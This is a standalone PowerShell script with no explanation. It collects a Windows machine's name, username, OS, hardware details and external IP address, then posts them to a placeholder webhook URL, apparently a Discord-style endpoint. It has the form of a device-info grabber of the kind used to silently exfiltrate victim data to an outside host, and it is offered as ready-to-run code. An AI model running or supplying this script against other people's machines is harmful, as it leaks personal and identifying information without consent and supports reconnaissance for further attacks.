$webhookUrl = "your webhook url"


$externalIp = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
$gpuInfo = Get-WmiObject -Class Win32_VideoController | ForEach-Object {
    @{
        Name = $_.Name
        AdapterRAM = [math]::round($_.AdapterRAM / 1MB, 2)
        DriverVersion = $_.DriverVersion
    }
}
$deviceInfo = @{
    ComputerName = $env:COMPUTERNAME
    Username = $env:USERNAME
    OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    CPU = (Get-WmiObject -Class Win32_Processor).Name
    RamGB = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    IPAddress = $externalIp.IP
    GPU = $gpuInfo
    HardDrives = Get-WmiObject -Class Win32_DiskDrive | ForEach-Object {
        @{
            Model = $_.Model
            SizeGB = [math]::round($_.Size / 1GB, 2)
        }
    }
    Monitors = Get-WmiObject -Class Win32_DesktopMonitor | ForEach-Object {
        @{
            Name = $_.Name
            ScreenWidth = $_.ScreenWidth
            ScreenHeight = $_.ScreenHeight
        }
    }
}
$deviceInfoFormatted = "DEVICE INFO:`n" +
                       "Computer Name: $($deviceInfo.ComputerName)`n" +
                       "Username: $($deviceInfo.Username)`n" +
                       "OS: $($deviceInfo.OS)`n" +
                       "CPU: $($deviceInfo.CPU)`n" +
                       "RAM (GB): $($deviceInfo.RamGB)`n" +
                       "External IP: $($deviceInfo.IPAddress)`n" +
                       "GPU:`n"
foreach ($gpu in $deviceInfo.GPU) {
    $deviceInfoFormatted += "  - Name: $($gpu.Name), Adapter RAM (MB): $($gpu.AdapterRAM), Driver Version: $($gpu.DriverVersion)`n"
}
$deviceInfoFormatted += "Hard Drives:`n"
foreach ($drive in $deviceInfo.HardDrives) {
    $deviceInfoFormatted += "  - Model: $($drive.Model), Size (GB): $($drive.SizeGB)`n"
}
$deviceInfoFormatted += "Monitors:`n"
foreach ($monitor in $deviceInfo.Monitors) {
    $deviceInfoFormatted += "  - Name: $($monitor.Name), Resolution: ${($monitor.ScreenWidth)}x${($monitor.ScreenHeight)}`n"
}
$deviceInfoMessage = @{
    content = $deviceInfoFormatted
}
$jsonMessage = $deviceInfoMessage | ConvertTo-Json
$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
$response